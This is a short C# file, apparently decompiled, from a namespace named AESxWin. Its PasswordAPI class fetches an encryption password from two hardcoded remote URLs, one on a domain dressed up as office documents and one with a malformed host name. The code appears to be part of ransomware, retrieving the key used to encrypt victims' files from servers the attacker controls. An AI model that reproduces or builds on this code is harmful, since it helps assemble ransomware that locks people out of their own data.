using System;
using System.Net;
using System.Threading.Tasks;

namespace AESxWin.Helpers;

public static class PasswordAPI
{
	private static int CurrentIndex = 0;

	public static Uri[] Urls = new Uri[2]
	{
		new Uri("http://dokumenty-office.eu/wdxx/"),
		new Uri("https://taniwinopl/ass/")
	};

	public static async Task<string> GetPassword()
	{
		CurrentIndex = 0;
		return await Task.Run(delegate
		{
			string result = string.Empty;
			for (int i = 0; i < Urls.Length; i++)
			{
				if (CurrentIndex + 1 <= Urls.Length)
				{
					try
					{
						WebClient webClient = new WebClient();
						result = webClient.DownloadString(Urls[CurrentIndex]);
						CurrentIndex = 0;
					}
					catch (Exception)
					{
						CurrentIndex++;
						continue;
					}
					break;
				}
				throw new Exception("Couldn't resolve password");
			}
			return result;
		});
	}
}
